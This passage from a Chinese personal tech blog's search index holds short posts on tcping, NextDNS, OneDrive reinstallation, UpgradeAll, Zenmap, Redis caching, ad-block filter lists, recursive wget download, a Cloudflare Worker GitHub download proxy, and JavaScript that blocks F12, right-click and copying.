4.测试TCPING: 1234567[root@localhost bin]# tcping 8.8.8.8 53# 通过TCP-PING 8.8.8.8 端口 53 traceroute to 8.8.8.8 (8.8.8.8), 255 hops max, 60 byte packetsseq 0: tcp response from google-public-dns-a.google.com (8.8.8.8) &lt;syn,ack&gt; 1.723 mstraceroute to 8.8.8.8 (8.8.8.8), 255 hops max, 60 byte packetsseq 1: tcp response from google-public-dns-a.google.com (8.8.8.8) &lt;syn,ack&gt; 8.850 mstraceroute to 8.8.8.8 (8.8.8.8), 255 hops max, 60 byte packets 附录用法详解: 123456789# 用法：tcpping [-d] [-c] [-C] [-w sec] [-q num] [-x count] ipaddress [port]# -d 在每个响应时间前，打印时间戳# -c 以列表形式显示# -C 输出类似于fping工具中-C选项的结果# -w 等待时间（默认 3）# -r 每N秒重试一次（默认 1）# -x 限定测试总时长 (默认 无限)# 实例：测试服务器到大陆TCP是否畅通# 在这里，我们要用到百度官网的IP：119.75.217.109 以及他的TCP端口：80 教程就到此结束啦!本博客文章均为原创，转载请注明来源","link":"/Blog/2020/04/21/Linux%E4%B8%8B%E7%9A%84TCP%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94TCPING%E7%9A%84%E7%AE%80%E6%98%8E%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"title":"NextDNS-一个性化DNS","text":"在得知阿里DNS支持DOH之后，我试用了将近一周，发现他并不能让我满意，他和大多数公共DNS一样，被污染了，直接给我不返回解析，在DNS被污染的情况下,DOH又能起多大用呢，对于另一家红鱼DNS，虽然说是免费一个月，但一个月后不能白嫖，还是没去用，后来我在基安发现了它-NextDNS打开官网：nextdns.io ，注册登录，于是乎你就可以看到这样一个界面网站会自动给你下发DNS，你想要的DOH(DNS-over-HTTPS)，DOT(DNS-over-TLS)全都有！当然，它还有类似于红鱼DNS的功能，个性化功能如下图一览:对于费用方面，白嫖党的胜利？（不是）每月30万DNS免费请求，付费版12RMB/Month，无限制速度方面数据源自ipip.net中国大陆ping检测情况，基本无丢包，延迟均在80-100左右","link":"/Blog/2020/08/22/NextDNS-%E4%B8%80%E4%B8%AA%E6%80%A7%E5%8C%96DNS/"},{"title":"OneDrive重装提示已安装的解决方案","text":"##本文来自微软客服: 打开命令提示符在管理员模式下 ︰ 用鼠标右键单击 Windows 任务栏中的图标并选择命令提示符 （管理员）。 输入 taskkill /f /im OneDrive.exe 终止任何OneDrive进程并按下回车键。 然后在任一中键入下面的命令，这取决于如果你有一个 64 个或 32 位的系统，这将卸载OneDrivea. %SystemRoot%\\SysWOW64\\OneDriveSetup.exe /uninstall 如果你使用的 64 位 （更常见）b. %SystemRoot%\\System32\\OneDriveSetup.exe /uninstall 如果你使用的 32 位 Onedrive已被卸载，请转到【新的 OneDrive 同步客户端】后进行下载 ； 运行下载和允许完成下载，这将确保安装了最新版本的同步引擎； 一旦运行中，如果对话标志没有出现，请左键单击右下角系统通知区域中的OneDrive图标并尝试是否可正常登录即可。","link":"/Blog/2020/05/20/OneDrive%E9%87%8D%E8%A3%85%E6%8F%90%E7%A4%BA%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"UpgradeAll - 用一款软件，检查所有应用更新","text":"前言以前我总是想着：有没有什么应用可以一键检查手机里所有应用的更新，并且可以追踪自己添加的软件呢，直到我在ExploreGithub上的项目时，发现了一款名叫UpgradeAll的应用,它不仅能检查手机应用更新，还能实现从云规则下载软件源，自行添加软件源等等功能，所以来给大家安利一下。 UpgradeAll 介绍UpgradeAll这款软件可以让你通过它来检测某个应用是否有更新并帮你下载更新，但是却不同于Google Play，CoolApk等应用市场，他们只能检测到商店所上架应用的更新，而UpgradeAll就不同了，他支持很多个应用发布渠道，像Github，CoolApk，F-Droid啊（更多的在下方列举）它都是支持的。这对于应用有多种安装渠道的 Android 系统来说，是个非常好的工具。因为你不用打开各个应用商店来检查你手机里的应用是否为最新版。这个应用的开发者们还提供了云规则，覆盖了一些深受网友们喜爱的色批（正经）软件。另外，对于想自己尝试的用户，可以自行选择应用渠道并设置更新规则。（下面是来自UPA开发者肖战的划重点） UpgradeAll 目前支持下列应用发布渠道的应用更新检测： Github Z直播 酷安 闪电下载 手机乐园 F-droid Xposed Module Repository PanDownloadAndroid GitLab Google Play（将在UpgradeAll正式版完全支持） UpgradeAll 的使用第一次接触这个软件可能会一脸茫然（哈？这软件怎么用的？）所以下面会详细介绍一下软件的使用 UpgradeAll 云规则的使用方法安装之后打开左侧侧边栏，选择云规则(别问为啥有个2B在上面，问就是我喜欢)在云规则列表里，有俩个选项，一个是开发者/社区维护者们提供的一些应用更新检测配置（如下图），如果有应用是你需要的，可以先点击右上角的搜索按钮，搜索一下软件名字。如果没有，可以先转到软件源，根据自己想添加的应用发布渠道，下载软件源云端配置留着备用 对于想要自己配置应用更新规则的，可以继续看下面的教程。 UpgradeAll 自主添加应用规则回到主页-全部应用，点击右下角加号按钮,会出现如下两个选项添加单个跟踪项可以添加任何UpgradeAll支持的软件源,添加应用市场则可以对比本地已安装应用的版本号和应用市场是否一致，如果有更新版本则提示更新。选择添加单个跟踪项之后，会出现如下界面这个就是自己配置更新规则的界面了,虽然旁边有帮助按钮，但是我还是想多此一举一项一项和大家解释 软件源：指你想要添加的应用来自于哪里，还记得我一开始说留着备用的软件源云端配置吗 （ 名称： 顾名思义，用来填软件名的，当然啦，只要是自己记得住的都行 网址：应用发布的地方，让软件帮你去看看是否有更新 跟踪目标：要填写应用完整的包名称，不然软件获取不到本地应用的版本号，则无法判断是否有跟新 如果无法理解的话，下面以UpgradeAll这个软件来举例,这个应用发布于Github,发布地址为：https://github.com/DUpdateSystem/UpgradeAll，应用的包名为net.xzos.upgradeall,那么则需要这么填写: 软件源：Github 名称：UpgradeAll (或者留空) 网址：https://github.com/DUpdateSystem/UpgradeAll 跟踪目标：net.xzos.upgradeall 像我这样添加好之后，你就可以在软件列表里看到刚添加的引用了，点开之后还能看到更详细的应用跟新信息：啊？你说为什么最新版本和本地版本版本号差这么多？问就是开发者太懒了 PS:一般大家都可以轻松的从应用发布网站找到包名。实在找不到的，可打开手机文件管理,打开Android/data/文件夹这个目录里的文件夹都是所有软件的完整包名。什么？你还是觉得麻烦？那建议使用这个软件：LibChecker UpgradeAll 应用信息应用名称：UpgradeAll应用作者：xz-dev系统版本要求：Android 5.0 及更高版本 (或许)支持语言：中文英文皆可开源协议：GPL-3.0开源地址：https://github.com/DUpdateSystem/UpgradeAllGithub 下载：https://github.com/DUpdateSystem/UpgradeAll/releases酷安应用市场地址：https://www.coolapk.com/apk/net.xzos.upgradeall","link":"/Blog/2020/10/19/UpgradeAll---%E7%94%A8%E4%B8%80%E6%AC%BE%E8%BD%AF%E4%BB%B6%EF%BC%8C%E6%A3%80%E6%9F%A5%E6%89%80%E6%9C%89%E5%BA%94%E7%94%A8%E6%9B%B4%E6%96%B0/"},{"title":"Zenmap扫描工具的使用","text":"前言###Nmap和Zenmap Nmap是一个开源免费的网络发现工具，通过它能够找出网络上在线的主机，并测试主机上哪些端口处于监听状态，接着通过端口确定主机上运行的应用程序类型与版本信息，最后利用它还能侦测出操作系统的类型和版本。由此可见，Nmap是一个功能非常强大的网络探测工具，同时它也成为网络黑客的最爱，因为Nmap所实现的这些功能正是黑客入侵网络的一个基本过程。站在安全运维的角度，只有了解了黑客入侵的基本方式和过程，才能有目的、有针对性地进行安全防护，这也正是本节重点介绍Nmap这个网络嗅探工具的原因。Nmap是Network Mapper的缩写，由Fyodor在1997年创建，现在已经成为网络安全必备的工具之一。Nmap作为一个流行的安全工具，它的主要特点有： 非常灵活。Nmap支持10多种扫描方式，并支持多种目标对象扫描。 支持主流操作系统。Nmap支持Windows、Linux、BSD、Solaris、AIX、Mac OS等多种平台，可移植性强。 使用简单。Nmap安装、使用都非常简单，基本用法就能满足一般使用需求。 自由软件。Nmap是在GPL协议下发布的，在GPL License的范围内可自由使用。Zenmap是Nmap的GUI版本，由Nmap官方提供，通常随着Nmap安装包一起发布。Zenmap是用Python语言编写的，能够在Windows、Linux、UNIX、Mac OS等不同系统上运行。开发Zenmap的目的主要是为Nmap提供更加简单的操作方式。","link":"/Blog/2020/04/30/Zenmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"为Typecho博客加速——使用Redis及TpCache缓存插件为网站加速","text":"#前言这段时间我在我的删库塔（宝塔）看了一下我博客访问时的CPU占用，让我没想到的是，首次访问网站时机器的CPU占用高达**97.8%**，这让我惊讶不已，所以我想到使用Redis来对全站进行动态缓存，它不仅能够加快网站的访问速度，提升访客体验；同时也能保持在高并发状态下的稳定性，降低对服务器的资源占用。 在Github搜了搜关键词，并按提供的教程实现，这篇博客就来辣！ #介绍##RedisRedis 是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。 Redis的优势： 性能极高 – Redis能读的速度是110000次/s,写的速度是81000次/s 。 丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。 原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作合并后的原子性执行。（事务） 丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。 Redis 与其他 key - value 缓存产品有以下三个特点： Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份。 ##TpCacheTpCache是由老高开发的一款Typecho缓存插件，支持Memcache，Redis，Mysql三种驱动。项目地址：https://github.com/phpgao/TpCache #安装##Redis因为我用的时删库塔，可一键便捷安装Redis。如图：[warn-block]千万不要从宝塔开启6379外网访问，因为会把端口开放给外网，而TpCache是不支持密码连接Redis的。这种操作会使任何人都能访问并管理Redis，很危险。[/warn-block]##TpCache到项目地址下载插件包并解压，修改文件夹名为TpCache，上传到Typecho插件目录（/usr/plugins),接着到后台启用插件。如果博客使用https则开启SSL，缓存驱动选择Redis，端口默认为6379（可到宝塔面板修改），保存设置即可启用Typecho的Redis。 #管理在宝塔面板的软件商店中，安装Redis数据管理工具，即可对Redis进行管理查看，如图：如需清除所有Redis缓存，在插件中的最后一项选择清除所有数据，保存设置即可。 #后记启用Redis后确实降低了小鸡的CPU占用并提升了博客的访问速度和稳定性，不过博客的评论功能貌似会爆炸 （只能说有利有弊吧 （","link":"/Blog/2020/10/19/%E4%B8%BATypecho%E5%8D%9A%E5%AE%A2%E5%8A%A0%E9%80%9F%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8Redis%E5%8F%8ATpCache%E7%BC%93%E5%AD%98%E6%8F%92%E4%BB%B6%E4%B8%BA%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F/"},{"title":"也许是史上最全的广告拦截资源整理","text":"#ABP 兼容规则##Easylist ChinaABP官方维护的的适合国内使用的规则，更新频繁。https://easylist-downloads.adblockplus.org/easylistchina.txt ##CJX’s Annoyance List这是”EasyList China+EasyList” &amp; “EasyPrivacy”的补充。2015.2.4发布,过滤烦人的自我推广,并补充EasyPrivacy隐私规则.https://gitee.com/cjx82630/cjxlist/raw/master/cjx-annoyance.txt ##ADgk一个专门为安卓版adguard写的规则,适合在手机浏览器中使用的拦截规则。https://gitee.com/banbendalao/adguard/raw/master/ADgk.txt ##jiekouAD维护的专门针对手机端盗版网站广告的拦截规则.https://gitee.com/damengzhudamengzhu/guanggaoguolv/blob/master/jiekouAD.txt ##乘风广告过滤规则乘风广告拦截资源在国内的镜像源https://gitee.com/xinggsf/Adblock-Rule/raw/master/rule.txt ##乘风视频过滤规则乘风视频广告拦截资源在国内的镜像源https://gitee.com/xinggsf/Adblock-Rule/raw/master/mv.txt ##Anti-AD号称是目前中文区命中率最高的广告过滤列表，实现了精确的广告屏蔽和隐私保护Github: https://raw.githubusercontent.com/privacy-protection-tools/anti-AD/master/anti-ad-easylist.txtCDN加速 https://cdn.jsdelivr.net/gh/privacy-protection-tools/anti-AD@master/anti-ad-easylist.txt ##广告终结者插件使用的拦截规则广告终结者使用的拦截规则，基于ChinaList+EasyList修正维护http://sub.adtchrome.com/adt-chinalist-easylist.txt ##EasylistChina+EasylistLite+CJX’sAnnoyance由 halflife 维护的拦截规则 ，合并了 EasylistChina、EasylistLite、CJX’sAnnoyance，以及补充的一些规则，每日更新。https://gitee.com/halflife/list/raw/master/ad.txt #主机列表##yhostsyhosts是国内比较知名的host维护列表，原作者目前已经停止维护,目前由VeleSila接手更新。https://raw.githubusercontent.com/VeleSila/yhosts/master/hosts.txt ##1024网站及澳门皇家赌场及恶意广告主机列表1024网站及澳门皇家赌场及恶意广告主机列表,你懂得https://raw.githubusercontent.com/Goooler/1024_hosts/master/hosts ##iOSAdblockList有海外维护针对移动网站的广告主机列表https://raw.githubusercontent.com/BlackJack8/iOSAdblockList/master/iPv4Hosts.txt ##StevenBlack国外维护比较知名的屏幕广告主机列表,整合和扩展多个精心设计的主机文件. github上获得15k+ Start 可以通过脚本生成你自己的hosts文件。https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts ##HblockHblock是一个脚本程序，他会自动提取来自很多规则源的恶意广告主机列表，比如 EasyList,AdGuard,uBlock ,disconnect.me 等数十个规则源，下面的链接是由该脚本生成的主机列表。https://hblock.molinero.dev/hosts ##MVPS host屏蔽美欧地区英文网站相关的广告http://winhelp2002.mvps.org/hosts.txt ##hmirror来自海外西班牙用户整理的各种主机拦截资源汇总，包括来自adguard,easylist,ublock的主机资源. 下面是主机资源汇总页面https://github.com/hectorm/hmirror/ #其他广告拦截资源汇总##easylist 相关的资源汇总包括EasyList, EasyPrivacy, EasyList Cookie, Fanboy’s Social/Annoyances/Notifications Blocking List等https://github.com/easylist/easylist/ ##uBlockOrigin 相关资源汇总https://github.com/uBlockOrigin/uAssets ##Adgurad 拦截规则资源分类汇总https://kb.adguard.com/en/general/adguard-ad-filters ##来自海外用户整理的规则源Annoyanceshttps://filters.adtidy.org/extension/chromium/filters/14.txtSimplified Domain Nameshttps://filters.adtidy.org/extension/chromium/filters/15.txtFanboy’s Social Blocking Listhttps://easylist.to/easylist/fanboy-social.txtFanboy’s Annoyances Listhttps://easylist.to/easylist/fanboy-annoyance.txtFanboy’s Enhanced Tracking Listhttps://fanboy.co.nz/enhancedstats.txtAdblock Warning Removal Listhttps://easylist-downloads.adblockplus.org/antiadblockfilters.txtAnti-Adblock Killer | Reekhttps://raw.githubusercontent.com/reek/anti-adblock-killer/master/anti-adblock-killer-filters.txtMalware Domainshttps://easylist-downloads.adblockplus.org/malwaredomains_full.txtPeter Lowe’s Listhttp://pgl.yoyo.org/adservers/serverlist.php%3Fhostformat%3Dadblockplus%26mimetype%3DplaintextPrebakehttps://raw.github.com/liamja/Prebake/master/obtrusive.txtSpam 404https://raw.githubusercontent.com/Dawsey21/Lists/master/adblock-list.txtBarbBlockhttps://raw.githubusercontent.com/paulgb/BarbBlock/master/blacklists/adblock-plus.txtNoCoin Adblock listhttps://raw.githubusercontent.com/hoshsadiq/adblock-nocoin-list/master/nocoin.txt ##去广告效果检测网站 https://checkadblock.ru/ https://blockads.fivefilters.org/ https://canyoublockit.com/extreme-test/ https://ads-blocker.com/testing/ https://www.detectadblock.com/ http://simple-adblock.com/faq/testing-your-adblocker/ ##参考资料 https://gitee.com/halflife/list/ https://github.com/otobtc/ADhosts https://github.com/cjx82630/cjxlist https://github.com/hectorm/hblock https://github.com/vokins/yhosts https://github.com/StevenBlack/hosts https://ublock.org/ https://github.com/uBlockOrigin/uAssets https://github.com/easylist/easylist/ https://github.com/privacy-protection-tools/anti-AD https://easylist.to/ 本文来自：X浏览器","link":"/Blog/2020/07/21/%E4%B9%9F%E8%AE%B8%E6%98%AF%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/"},{"title":"买下所有Steam游戏要多少钱?","text":"很多人可能以前从未想过这个问题：买下Steam所有游戏和其他付费内容总共要多少钱？但事实上，我们可以从Steam上获取数据，找出购买所有付费项目需要多少钱。结果嘛……可能比很多人想象的要少得多？ 90后程序员，技术宅王成刚制作了一个名为“Buy All Steam Games”的网站，它会持续跟踪这个平台，并找出所有付费项目的累计价值。这意味着我们不仅可以获得Steam的历史数据(自2017年以来，付费项目的总价值增长了一倍多)，还可以查看在进行促销时总价值的降价幅度。 Click Here 当然，这除了游戏外，DLC和任何你在Steam上能买到的东西也算在内，比如原声带和设定集的数字版。截至目前，Steam 所有游戏打折后的价格为$521,909.63，而原价则为 $537,192.37。","link":"/Blog/2020/09/14/%E4%B9%B0%E4%B8%8B%E6%89%80%E6%9C%89Steam%E6%B8%B8%E6%88%8F%E8%A6%81%E5%A4%9A%E5%B0%91%E9%92%B1-/"},{"title":"使用 wget 下载一个目录下的所有文件","text":"今天想要下载清华源上的Termux源到本地，使用wget却只是下载了一个index.html于是我就参考资料，写此博客以记录方法如下： 1wget -r -np -nH -R index.html* -e robots=off https://mirrors.tuna.tsinghua.edu.cn/termux/ 各个参数的含义： -r : 遍历所有子目录-np : 不到上一层子目录去-nH : 不要将文件保存到主机名文件夹-R index.html : 不下载所有匹配到包含 index.html 的文件-e robots=off : 绕过网站的robots.txt下载文件 效果如下：","link":"/Blog/2020/04/21/%E4%BD%BF%E7%94%A8-wget-%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6/"},{"title":"使用CloudFlare加速GitHub下载","text":"前言GitHub 作为世界上最大的代码托管平台之一，国内当然有不少开发者和软件用户会使用 GitHub。但是由于 GitHub 主机的地理位置，国内访问 GitHub 的速度普遍较慢，更别说下载速度，惨不忍睹。对于没有能力魔法上网的用户确实是不太友好，有少部分地区甚至没有办法正常访问 GitHub。 最近发现了一个开源项目，能够通过 Cloudflare Workers 加速 GitHub 文件的下载，支持直接下载仓库和 Release，也可以单独下载 release 或者仓库内其中一个文件。自己尝试搭建了一下，没有能力的朋友可以通过下面的链接访问并下载 GitHub 上的文件。但是不要滥用，如果需要的话还是推荐自己搭建一下。https://github.johnsonran.workers.dev/尽管 Cloudflare 总体上在国内的速度也不太可观，但在某些地区的速度还是比较快的。个人测试了一下，如果使用魔法上网的话，用这个转发也会比直接在 GitHub 下载稍微快一些（日本的节点）。###原项目这个Worker的JavaScript脚本是hunsh大佬写的，可以在GitHub上访问hunshcn/gh-proxy并点击Star支持一下原作者୧(๑•̀⌄•́๑)૭###自己搭建原作者在README中，进用四行文本就把这个程序的搭建方法写清楚了： 首页：https://workers.cloudflare.com注册，登陆，Start building，取一个子域名，Create a Worker。复制index.js或index2.js到左侧代码框，Save and deploy。如果正常，右侧应显示首页。index.js的clone走github.com.cnpmjs.org,index2.js的 clone 走你的cf worker，请自行选择创建Worker [notice]如果你已经拥有 Cloudflare Workers，那么创建一个新的 Worker 就可以跳过此步[/notice]访问 CloudFlare并登录你的账号，如果没有则点击Sign up进行注册。随后进入到 Dashboard 页面，点击右侧边栏的 Workers 选项。点击后会让你自定义一个域名,不过是workers.dev的子域,一会你创建 Workers 的时候,一个Worker占用一个四级域名。之后会让你选择一个方案（Plan）,免费的对于小型的网站来说足够了,每天允许一万次请求，每分钟限制 1000 次；如果是花费五刀使用所谓的Unlimited方案，每月允许1000万次请求,超出部分按$0.5/百万次请求的方式计费。 之后，点击Create a Worker按钮来创建一个新的 Worker,然后继续下一步。 添加脚本原项目中有两个可选择的JavaScript脚本——index.js和index2.js。按照作者的意思，他们两个的主要区别是 Clone 的转发途径： index.js的clone走github.com.cnpmjs.org,index2.js的clone走你的CF Worker这里就自行选择了，复制按照需求复制代码即可： index.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150'use strict' /** * static files (404.html, sw.js, conf.js) */const ASSET_URL = 'https://hunshcn.github.io/gh-proxy' /** @type {RequestInit} */const PREFLIGHT_INIT = { status: 204, headers: new Headers({ 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS', 'access-control-max-age': '1728000', }),} /** * @param {any} body * @param {number} status * @param {Object&lt;string, string&gt;} headers */function makeRes(body, status = 200, headers = {}) { headers['access-control-allow-origin'] = '*' return new Response(body, {status, headers})} /** * @param {string} urlStr */function newUrl(urlStr) { try { return new URL(urlStr) } catch (err) { return null }} addEventListener('fetch', e =&gt; { const ret = fetchHandler(e) .catch(err =&gt; makeRes('cfworker error:\\n' + err.stack, 502)) e.respondWith(ret)}) /** * @param {FetchEvent} e */async function fetchHandler(e) { const req = e.request const urlStr = req.url const urlObj = new URL(urlStr) let path = urlObj.searchParams.get('q') if(path) { return Response.redirect('https://' + urlObj.host + '/' + path, 301) } // cfworker 会把路径中的 `//` 合并成 `/` path = urlObj.href.substr(urlObj.origin.length + 1).replace(/^https?:\\/+/, 'https://') const exp = /^(?:https?:\\/\\/)?github\\.com\\/.+?\\/.+?\\/(?:releases|archive)\\/.*$/ const exp2 = /^(?:https?:\\/\\/)?github\\.com\\/.+?\\/.+?\\/(?:blob)\\/.*$/ const exp3 = /^(?:https?:\\/\\/)?github\\.com\\/.+?\\/.+?\\/(?:info|git-upload-pack).*$/ if (path.search(exp)===0) { return httpHandler(req, path) }else if(path.search(exp2)===0) { const newUrl = path.replace('/blob/', '@').replace(/^(?:https?:\\/\\/)?github\\.com/, 'https://cdn.jsdelivr.net/gh') return Response.redirect(newUrl, 302) }else if (path.search(exp3)===0){ const newUrl = path.replace(/^(?:https?:\\/\\/)?github\\.com/, 'https://github.com.cnpmjs.org') return Response.redirect(newUrl, 302) } else { return fetch(ASSET_URL + path) }} /** * @param {Request} req * @param {string} pathname */function httpHandler(req, pathname) { const reqHdrRaw = req.headers // preflight if (req.method === 'OPTIONS' &amp;&amp; reqHdrRaw.has('access-control-request-headers') ) { return new Response(null, PREFLIGHT_INIT) } let rawLen = '' const reqHdrNew = new Headers(reqHdrRaw) const refer = reqHdrNew.get('referer') let urlStr = pathname if (urlStr.startsWith('github')) { urlStr = 'https://' + urlStr } const urlObj = newUrl(urlStr) /** @type {RequestInit} */ const reqInit = { method: req.method, headers: reqHdrNew, redirect: 'follow', body: req.body } return proxy(urlObj, reqInit, rawLen, 0)} /** * * @param {URL} urlObj * @param {RequestInit} reqInit */async function proxy(urlObj, reqInit, rawLen) { const res = await fetch(urlObj.href, reqInit) const resHdrOld = res.headers const resHdrNew = new Headers(resHdrOld) // verify if (rawLen) { const newLen = resHdrOld.get('content-length') || '' const badLen = (rawLen !== newLen) if (badLen) { return makeRes(res.body, 400, { '--error': `bad len: ${newLen}, except: ${rawLen}`, 'access-control-expose-headers': '--error', }) } } const status = res.status resHdrNew.set('access-control-expose-headers', '*') resHdrNew.set('access-control-allow-origin', '*') resHdrNew.delete('content-security-policy') resHdrNew.delete('content-security-policy-report-only') resHdrNew.delete('clear-site-data') return new Response(res.body, { status, headers: resHdrNew, })} index2.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146'use strict' /** * static files (404.html, sw.js, conf.js) */const ASSET_URL = 'https://hunshcn.github.io/gh-proxy' /** @type {RequestInit} */const PREFLIGHT_INIT = { status: 204, headers: new Headers({ 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS', 'access-control-max-age': '1728000', }),} /** * @param {any} body * @param {number} status * @param {Object&lt;string, string&gt;} headers */function makeRes(body, status = 200, headers = {}) { headers['access-control-allow-origin'] = '*' return new Response(body, {status, headers})} /** * @param {string} urlStr */function newUrl(urlStr) { try { return new URL(urlStr) } catch (err) { return null }} addEventListener('fetch', e =&gt; { const ret = fetchHandler(e) .catch(err =&gt; makeRes('cfworker error:\\n' + err.stack, 502)) e.respondWith(ret)}) /** * @param {FetchEvent} e */async function fetchHandler(e) { const req = e.request const urlStr = req.url const urlObj = new URL(urlStr) let path = urlObj.searchParams.get('q') if(path) { return Response.redirect('https://' + urlObj.host + '/' + path, 301) } // cfworker 会把路径中的 `//` 合并成 `/` path = urlObj.href.substr(urlObj.origin.length + 1).replace(/^https?:\\/+/, 'https://') const exp = /^(?:https?:\\/\\/)?github\\.com\\/.+?\\/.+?\\/(?:releases|archive|info|git-upload-pack).*$/ const exp2 = /^(?:https?:\\/\\/)?github\\.com\\/.+?\\/.+?\\/(?:blob)\\/.*$/ if (path.search(exp)===0) { return httpHandler(req, path) }else if(path.search(exp2)===0){ const newUrl = path.replace('/blob/', '@').replace(/^(?:https?:\\/\\/)?github\\.com/, 'https://cdn.jsdelivr.net/gh') return Response.redirect(newUrl, 302) } else { return fetch(ASSET_URL + path) }} /** * @param {Request} req * @param {string} pathname */function httpHandler(req, pathname) { const reqHdrRaw = req.headers // preflight if (req.method === 'OPTIONS' &amp;&amp; reqHdrRaw.has('access-control-request-headers') ) { return new Response(null, PREFLIGHT_INIT) } let rawLen = '' const reqHdrNew = new Headers(reqHdrRaw) const refer = reqHdrNew.get('referer') let urlStr = pathname if (urlStr.startsWith('github')) { urlStr = 'https://' + urlStr } const urlObj = newUrl(urlStr) /** @type {RequestInit} */ const reqInit = { method: req.method, headers: reqHdrNew, redirect: 'follow', body: req.body } return proxy(urlObj, reqInit, rawLen, 0)} /** * * @param {URL} urlObj * @param {RequestInit} reqInit */async function proxy(urlObj, reqInit, rawLen) { const res = await fetch(urlObj.href, reqInit) const resHdrOld = res.headers const resHdrNew = new Headers(resHdrOld) // verify if (rawLen) { const newLen = resHdrOld.get('content-length') || '' const badLen = (rawLen !== newLen) if (badLen) { return makeRes(res.body, 400, { '--error': `bad len: ${newLen}, except: ${rawLen}`, 'access-control-expose-headers': '--error', }) } } const status = res.status resHdrNew.set('access-control-expose-headers', '*') resHdrNew.set('access-control-allow-origin', '*') resHdrNew.delete('content-security-policy') resHdrNew.delete('content-security-policy-report-only') resHdrNew.delete('clear-site-data') return new Response(res.body, { status, headers: resHdrNew, })} 完成搭建 复制好之后，把他粘贴到Worker编辑页面左侧的Script栏里面，然后点击Save and Deploy。你可以在这个页面的左上角看到 worker 的域名（四级域名），你可以修改第四级的域名前缀，然后通过这个域名访问你的 worker，打开后应该是这个页面。尝试使用 原作者给出的合法链接实例是这样的： 分支源码：https://github.com/hunshcn/project/archive/master.ziprelease 源码：https://github.com/hunshcn/project/archive/v0.1.0.tar.gzrelease 文件：https://github.com/hunshcn/project/releases/download/v0.1.0/example.zip分支文件：https://github.com/hunshcn/project/blob/master/filename 我感觉写得不太明确，容易撞墙，所以在这里列出一个简易的方式：用鼠标右键复制你要下载的链接。例如仓库里的某一个文件，或者一个 Release 里的附件（Assets），直接右键复制链接。如果是要直接下载整个仓库（一个分支），或者一个分支里的文件，则是这样的格式： 123&lt;!-- master 可以替换成其他分支的名字 --&gt;https://github.com/&lt;user&gt;/&lt;repo&gt;/archive/master.ziphttps://github.com/&lt;user&gt;/&lt;repo&gt;/blob/master/&lt;filename&gt;","link":"/Blog/2020/04/21/%E4%BD%BF%E7%94%A8CloudFlare%E5%8A%A0%E9%80%9FGitHub%E4%B8%8B%E8%BD%BD/"},{"title":"使用JS屏蔽F12&#x2F;右键&#x2F;复制与查看源代码","text":"禁止F12 123456789101112131415//禁止F12document.onkeydown = function(){ if(window.event &amp;&amp; window.event.keyCode == 123) { alert(&quot;F12被禁用&quot;); event.keyCode=0; event.returnValue=false; } if(window.event &amp;&amp; window.event.keyCode == 13) { window.event.keyCode = 505; } if(window.event &amp;&amp; window.event.keyCode == 8) { alert(str+&quot;\\n请使用Del键进行字符的删除操作！&quot;); window.event.returnValue=false; }} 屏蔽右键菜单 12345678910111213141516//禁止右键document.oncontextmenu = function (event){ if(window.event){ event = window.event; } try{ var the = event.srcElement; if (!((the.tagName == &quot;INPUT&quot; &amp;&amp; the.type.toLowerCase() == &quot;text&quot;) || the.tagName == &quot;TEXTAREA&quot;)){ return false; } return true; } catch (e){ return false; }} 禁止选中 12345678910111213141516//禁止选中document.onselectstart = function (event){ if(window.event){ event = window.event; } try{ var the = event.srcElement; if (!((the.tagName == &quot;INPUT&quot; &amp;&amp; the.type.toLowerCase() == &quot;text&quot;) || the.tagName == &quot;TEXTAREA&quot;)){ return false; } return true; } catch (e) { return false; }} 禁止复制 12345678910111213141516//禁止复制document.oncopy = function (event){ if(window.event){ event = window.event; } try{ var the = event.srcElement; if(!((the.tagName == &quot;INPUT&quot; &amp;&amp; the.type.toLowerCase() == &quot;text&quot;) || the.tagName == &quot;TEXTAREA&quot;)){ return false; } return true; } catch (e){ return false; }} 禁止剪切 12345678910111213141516//禁止剪切document.oncut = function (event){ if(window.event){ event = window.event; } try{ var the = event.srcElement; if(!((the.tagName == &quot;INPUT&quot; &amp;&amp; the.type.toLowerCase() == &quot;text&quot;) || the.tagName == &quot;TEXTAREA&quot;)){ return false; } return true; } catch (e){ return false; }} 禁止粘贴 12345678910111213141516//禁止粘贴document.onpaste = function (event){ if(window.event){ event = window.event; } try{ var the = event.srcElement; if (!((the.tagName == &quot;INPUT&quot; &amp;&amp; the.type.toLowerCase() == &quot;text&quot;) || the.tagName == &quot;TEXTAREA&quot;)){ return false; } 